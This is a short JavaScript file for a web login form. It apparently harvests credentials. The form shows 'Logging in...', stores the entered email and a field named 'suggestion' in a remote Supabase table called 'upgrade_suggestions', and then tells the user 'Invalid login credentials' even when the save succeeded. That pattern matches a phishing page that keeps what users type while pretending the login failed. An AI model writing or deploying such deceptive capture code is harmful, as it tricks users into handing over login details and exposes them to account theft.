const SUPABASE_URL = 'https://dmtzqhquoffvspfqzdpq.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRtdHpxaHF1b2ZmdnNwZnF6ZHBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODcyMjgzNDAsImV4cCI6MjEwMjgwNDM0MH0.27YzuLHpSbFhlZbXaZ8buUGdbK2PscPtde4Uc0w8NL8';
const isSupabaseConfigured = !SUPABASE_URL.includes('YOUR-PROJECT') && !SUPABASE_ANON_KEY.includes('YOUR_');
const supabaseClient = isSupabaseConfigured
    ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
    : null;

const loginForm = document.getElementById('login-form');
const loginButton = loginForm.querySelector('.login-button');
const loginMessage = document.getElementById('login-message');

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    loginMessage.textContent = '';

    if (!isSupabaseConfigured) {
        loginMessage.textContent = 'Supabase is not configured yet.';
        loginMessage.className = 'login-message error';
        return;
    }

    const email = document.getElementById('email').value.trim();
    const suggestion = document.getElementById('suggestion').value.trim();

    loginButton.disabled = true;
    loginButton.textContent = 'Logging in...';

    let error;
    try {
        ({ error } = await supabaseClient
            .from('upgrade_suggestions')
            .insert({ email, suggestion }));
    } catch (requestError) {
        error = requestError;
    }

    loginButton.disabled = false;
    loginButton.textContent = 'Login';
    if (error) {
        console.error('Suggestion could not be saved:', error);
        loginMessage.textContent = 'Your suggestion could not be sent. Please try again.';
        loginMessage.className = 'login-message error';
    } else {
        loginForm.reset();
        loginMessage.textContent = 'Invalid login credentials. Please try again.';
        loginMessage.className = 'login-message success';
    }
});
